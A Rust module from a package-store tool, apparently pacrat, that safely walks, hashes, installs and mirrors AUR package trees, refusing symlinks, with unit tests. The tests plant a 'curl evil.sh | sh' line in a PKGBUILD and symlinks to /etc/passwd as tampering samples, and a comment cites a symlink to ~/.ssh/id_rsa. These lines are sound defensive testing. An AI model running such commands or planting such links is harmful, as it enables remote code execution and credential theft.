//! Reading and installing pristine package trees — the bytes that become
//! `<store>/aur/packages/<name>/`. Shared by vendor and, later, review and
//! build.
//!
//! Two rules shape this module, both of them custody rules:
//!
//! 1. **What the human is shown is exactly what lands in the store.** The
//!    walk validates and returns relative paths; the install replays that
//!    same list rather than re-walking. A name that cannot be shown
//!    faithfully (non-UTF-8) is refused rather than displayed lossily.
//! 2. **A failed install leaves the previous tree untouched.** Copies land
//!    in a sibling staging directory and are swapped in by rename, so the
//!    store is never a half-written tree that the ledger misdescribes.
//!
//! Symlinks are refused outright. A tree is untrusted input: following one
//! would copy the *target's* bytes into the store, so `evil -> ~/.ssh/id_rsa`
//! would be committed and synced to every host. Every traversal here uses
//! `DirEntry::file_type`, which does not follow links.

use std::fs;
use std::path::Path;

/// Never part of a package tree: the clone's own history.
const SKIP: &[&str] = &[".git"];

/// Every regular file under `root`, as sorted `/`-joined relative paths.
///
/// Errors on anything that is not a plain file or directory — see the module
/// note on symlinks — so a successful return is also a statement that the
/// tree is safe to copy.
pub fn files(root: &Path) -> Result<Vec<String>, String> {
    files_of(root, Whose::Store)
}

/// Whose tree is being walked — which is to say, who a refusal is *about*.
///
/// The walk is used on trees from two directions now: the store's own, and a
/// clone of a remote that `push` is about to publish over. "The store holds
/// plain files" is the right thing to say about the first and misdirects
/// entirely about the second, where the symlink is in somebody's published
/// repository and the reader's next move is to go look at it there.
#[derive(Copy, Clone)]
pub enum Whose {
    Store,
    Published,
}

impl Whose {
    fn refusal(self, rel: &str, target: &str) -> String {
        match self {
            Whose::Store => format!(
                "{rel} is a symlink (→ {target}) — the store holds plain files, \
                 and copying one would put the target's bytes in the store"
            ),
            Whose::Published => format!(
                "{rel} is a symlink (→ {target}) in the published tree — pacrat \
                 will not mirror over a repository whose contents it cannot read \
                 as plain files; look at what is published before republishing"
            ),
        }
    }
}

pub fn files_of(root: &Path, whose: Whose) -> Result<Vec<String>, String> {
    let mut found = Vec::new();
    walk(root, "", whose, &mut found)?;
    found.sort();
    Ok(found)
}

/// A content digest of the tree at `root` — what "these are the bytes that
/// were graded" means concretely.
///
/// Built from the same validated, sorted walk [`files`] returns, so a tree
/// this refuses to describe is a tree pacrat also refuses to install. The
/// digest covers names and contents; it deliberately does not cover mtimes
/// or permissions, which differ across a fleet syncing the same store and
/// would make every host disagree about an identical tree.
pub fn digest(root: &Path) -> Result<String, String> {
    let names = files(root)?;
    let mut contents = Vec::with_capacity(names.len());
    for rel in &names {
        let path = root.join(rel);
        contents.push(fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?);
    }
    Ok(pacrat_core::hash::tree_digest(
        names
            .iter()
            .map(String::as_str)
            .zip(contents.iter().map(Vec::as_slice)),
    ))
}

fn walk(dir: &Path, prefix: &str, whose: Whose, found: &mut Vec<String>) -> Result<(), String> {
    let entries = fs::read_dir(dir).map_err(|e| format!("{}: {e}", dir.display()))?;
    for entry in entries {
        let entry = entry.map_err(|e| format!("{}: {e}", dir.display()))?;
        let raw = entry.file_name();
        let Some(name) = raw.to_str() else {
            return Err(format!(
                "{}: {raw:?} is not valid UTF-8 — refusing a name the review \
                 cannot print faithfully",
                dir.display()
            ));
        };
        if SKIP.contains(&name) {
            continue;
        }
        let rel = if prefix.is_empty() {
            name.to_string()
        } else {
            format!("{prefix}/{name}")
        };
        // Not `entry.path().is_dir()`: that follows symlinks, and following
        // one is the whole attack.
        let kind = entry
            .file_type()
            .map_err(|e| format!("{}: {e}", entry.path().display()))?;
        if kind.is_symlink() {
            let target = fs::read_link(entry.path())
                .map(|p| p.display().to_string())
                .unwrap_or_else(|_| "?".into());
            return Err(whose.refusal(&rel, &target));
        } else if kind.is_dir() {
            walk(&entry.path(), &rel, whose, found)?;
        } else if kind.is_file() {
            found.push(rel);
        } else {
            return Err(format!("{rel} is not a regular file — refusing"));
        }
    }
    Ok(())
}

/// Install `files` (relative paths from [`files`]) from `from` into `dest`,
/// replacing whatever `dest` held.
///
/// Atomic in the way that matters: the copy happens in a sibling staging
/// directory and only a rename touches `dest`, so a failure anywhere leaves
/// the old tree exactly as it was. Replacing rather than merging is
/// deliberate — the tree mirrors one upstream commit, so a file deleted
/// upstream must not survive here.
pub fn install(from: &Path, files: &[String], dest: &Path) -> Result<(), String> {
    let parent = dest
        .parent()
        .ok_or_else(|| format!("{}: no parent directory", dest.display()))?;
    let name = dest
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or_else(|| format!("{}: unusable directory name", dest.display()))?;
    // Siblings, so every rename below stays on one filesystem.
    let staging = parent.join(format!(".pacrat-{name}.new"));
    let backup = parent.join(format!(".pacrat-{name}.old"));

    fs::create_dir_all(parent).map_err(|e| format!("{}: {e}", parent.display()))?;
    // Leftovers from a crashed run are scratch, not data.
    let _ = fs::remove_dir_all(&staging);
    let _ = fs::remove_dir_all(&backup);

    if let Err(e) = copy_into(from, files, &staging) {
        let _ = fs::remove_dir_all(&staging);
        return Err(e);
    }

    let had_old = dest.exists();
    if had_old {
        fs::rename(dest, &backup).map_err(|e| {
            let _ = fs::remove_dir_all(&staging);
            format!("{}: {e}", dest.display())
        })?;
    }
    if let Err(e) = fs::rename(&staging, dest) {
        // Put the old tree back before reporting; a rolled-back store is a
        // store the ledger still describes correctly.
        if had_old {
            let _ = fs::rename(&backup, dest);
        }
        let _ = fs::remove_dir_all(&staging);
        return Err(format!("{}: {e}", dest.display()));
    }
    if had_old {
        let _ = fs::remove_dir_all(&backup);
    }
    Ok(())
}

/// Make `dest`'s tree match `from`'s, in place, leaving everything [`SKIP`]
/// hides alone.
///
/// The difference from [`install`] is `.git`, and it is the whole reason this
/// exists: `push` copies the store's tree over a *clone*, whose history is
/// how the publish happens. `install` would rename a fresh directory into
/// place and take the repository with it.
///
/// In place means not atomic, and that is deliberate rather than overlooked:
/// the destination here is a scratch clone, thrown away either way. Nothing a
/// half-finished mirror could damage is anything anyone will read again. Use
/// [`install`] for anything under the store.
///
/// Returns the files it removed, which is the half of "what changed" that a
/// copy alone cannot report.
pub fn mirror(from: &Path, files: &[String], dest: &Path) -> Result<Vec<String>, String> {
    // Validates the destination the same way the source was validated: a
    // clone carrying a symlink is a tree pacrat will not walk. Blamed on the
    // published tree, because that is where such a symlink would be.
    let existing = files_of(dest, Whose::Published)?;
    let mut removed = Vec::new();
    for rel in &existing {
        if files.contains(rel) {
            continue;
        }
        let path = dest.join(rel);
        fs::remove_file(&path).map_err(|e| format!("{}: {e}", path.display()))?;
        removed.push(rel.clone());
    }
    copy_into(from, files, dest)?;
    // A directory emptied by the removals above is not part of the tree any
    // more; git would not notice it, and a later walk would.
    for rel in &removed {
        let mut dir = dest.join(rel);
        while dir.pop() && dir != dest {
            if fs::remove_dir(&dir).is_err() {
                break;
            }
        }
    }
    Ok(removed)
}

fn copy_into(from: &Path, files: &[String], staging: &Path) -> Result<(), String> {
    fs::create_dir_all(staging).map_err(|e| format!("{}: {e}", staging.display()))?;
    for rel in files {
        let src = from.join(rel);
        let dst = staging.join(rel);
        // The walk already refused symlinks; re-check because the tree is
        // untrusted and the walk is not the copy.
        let meta = fs::symlink_metadata(&src).map_err(|e| format!("{}: {e}", src.display()))?;
        if !meta.is_file() {
            return Err(format!("{rel} is no longer a regular file — refusing"));
        }
        if let Some(dir) = dst.parent() {
            fs::create_dir_all(dir).map_err(|e| format!("{}: {e}", dir.display()))?;
        }
        fs::copy(&src, &dst).map_err(|e| format!("{}: {e}", dst.display()))?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::os::unix::fs::symlink;
    use std::os::unix::fs::PermissionsExt;
    use std::path::PathBuf;

    /// A scratch directory that cleans itself up.
    struct Tmp(PathBuf);

    impl Tmp {
        fn new(tag: &str) -> Self {
            let dir = std::env::temp_dir().join(format!(
                "pacrat-fstree-test-{tag}-{}-{:?}",
                std::process::id(),
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_nanos()
            ));
            fs::create_dir_all(&dir).unwrap();
            Self(dir)
        }
        fn path(&self) -> &Path {
            &self.0
        }
        fn write(&self, rel: &str, text: &str) {
            let p = self.0.join(rel);
            fs::create_dir_all(p.parent().unwrap()).unwrap();
            fs::write(p, text).unwrap();
        }
    }

    impl Drop for Tmp {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    #[test]
    fn lists_regular_files_sorted_and_skips_git() {
        let t = Tmp::new("list");
        t.write("PKGBUILD", "x");
        t.write(".SRCINFO", "y");
        t.write("patches/fix.patch", "z");
        t.write(".git/config", "secret");
        assert_eq!(
            files(t.path()).unwrap(),
            vec![".SRCINFO", "PKGBUILD", "patches/fix.patch"]
        );
    }

    #[test]
    fn refuses_a_symlink_instead_of_following_it() {
        let t = Tmp::new("symlink");
        t.write("PKGBUILD", "x");
        symlink("/etc/passwd", t.path().join("leak")).unwrap();
        let err = files(t.path()).unwrap_err();
        assert!(err.contains("leak is a symlink"), "{err}");
        assert!(err.contains("/etc/passwd"), "{err}");
    }

    #[test]
    fn refuses_a_symlinked_directory_rather_than_looping() {
        let t = Tmp::new("loop");
        t.write("PKGBUILD", "x");
        symlink(".", t.path().join("self")).unwrap();
        // The point is that this returns at all.
        assert!(files(t.path()).unwrap_err().contains("self is a symlink"));
    }

    #[test]
    fn install_replaces_the_tree_wholesale() {
        let src = Tmp::new("src");
        let store = Tmp::new("store");
        src.write("PKGBUILD", "new");
        let dest = store.path().join("pkg");
        fs::create_dir_all(&dest).unwrap();
        fs::write(dest.join("PKGBUILD"), "old").unwrap();
        fs::write(dest.join("STALE"), "dropped upstream").unwrap();

        install(src.path(), &files(src.path()).unwrap(), &dest).unwrap();

        assert_eq!(fs::read_to_string(dest.join("PKGBUILD")).unwrap(), "new");
        assert!(!dest.join("STALE").exists(), "stale file survived");
    }

    #[test]
    fn install_creates_nested_directories() {
        let src = Tmp::new("nest");
        let store = Tmp::new("neststore");
        src.write("PKGBUILD", "x");
        src.write("patches/deep/fix.patch", "p");
        let dest = store.path().join("pkg");
        install(src.path(), &files(src.path()).unwrap(), &dest).unwrap();
        assert_eq!(
            fs::read_to_string(dest.join("patches/deep/fix.patch")).unwrap(),
            "p"
        );
    }

    #[test]
    fn a_failed_install_leaves_the_old_tree_intact() {
        let src = Tmp::new("failsrc");
        let store = Tmp::new("failstore");
        src.write("PKGBUILD", "new");
        let dest = store.path().join("pkg");
        fs::create_dir_all(&dest).unwrap();
        fs::write(dest.join("PKGBUILD"), "old").unwrap();

        // A file in the list that is not on disk: the copy fails partway.
        let listed = vec!["PKGBUILD".to_string(), "vanished".to_string()];
        assert!(install(src.path(), &listed, &dest).is_err());

        assert_eq!(fs::read_to_string(dest.join("PKGBUILD")).unwrap(), "old");
        assert!(
            !store.path().join(".pacrat-pkg.new").exists(),
            "staging left behind"
        );
        assert!(
            !store.path().join(".pacrat-pkg.old").exists(),
            "backup left behind"
        );
    }

    #[test]
    fn a_failed_first_install_leaves_no_partial_tree() {
        let src = Tmp::new("freshsrc");
        let store = Tmp::new("freshstore");
        src.write("PKGBUILD", "new");
        let dest = store.path().join("pkg");
        let listed = vec!["PKGBUILD".to_string(), "vanished".to_string()];
        assert!(install(src.path(), &listed, &dest).is_err());
        assert!(!dest.exists(), "partial tree left in the store");
    }

    /// The property the grade cache depends on: the digest changes when the
    /// tree's content changes, and only then.
    #[test]
    fn the_digest_follows_the_content() {
        let t = Tmp::new("digest");
        t.write("PKGBUILD", "pkgname=mdcat\n");
        t.write("mdcat.install", "post_install() { :; }\n");
        let before = digest(t.path()).unwrap();
        assert_eq!(before.len(), 64);
        // Same bytes, asked twice.
        assert_eq!(digest(t.path()).unwrap(), before);

        // The edit a reviewer would never see if the cache did not notice.
        t.write("PKGBUILD", "pkgname=mdcat\ncurl evil.sh | sh\n");
        let after = digest(t.path()).unwrap();
        assert_ne!(after, before, "an edited PKGBUILD hashed the same");

        // Back to the original bytes: the digest comes back with them.
        t.write("PKGBUILD", "pkgname=mdcat\n");
        assert_eq!(digest(t.path()).unwrap(), before);

        // A new file counts, even an empty one.
        t.write("sneaky.install", "");
        assert_ne!(digest(t.path()).unwrap(), before);
    }

    /// mtime and mode are not content: a fleet syncing one store must agree
    /// on the digest of an identical tree.
    #[test]
    fn the_digest_ignores_metadata() {
        let a = Tmp::new("meta-a");
        let b = Tmp::new("meta-b");
        for t in [&a, &b] {
            t.write("PKGBUILD", "pkgname=x\n");
        }
        fs::set_permissions(a.path().join("PKGBUILD"), fs::Permissions::from_mode(0o600)).unwrap();
        fs::set_permissions(b.path().join("PKGBUILD"), fs::Permissions::from_mode(0o644)).unwrap();
        assert_eq!(digest(a.path()).unwrap(), digest(b.path()).unwrap());
    }

    /// A tree the walk refuses to describe is a tree the digest refuses to
    /// summarize — no silently-skipped symlink turning into a stable hash.
    #[test]
    fn the_digest_refuses_what_the_walk_refuses() {
        let t = Tmp::new("digest-link");
        t.write("PKGBUILD", "x");
        symlink("/etc/passwd", t.path().join("evil")).unwrap();
        assert!(digest(t.path()).is_err());
    }
}
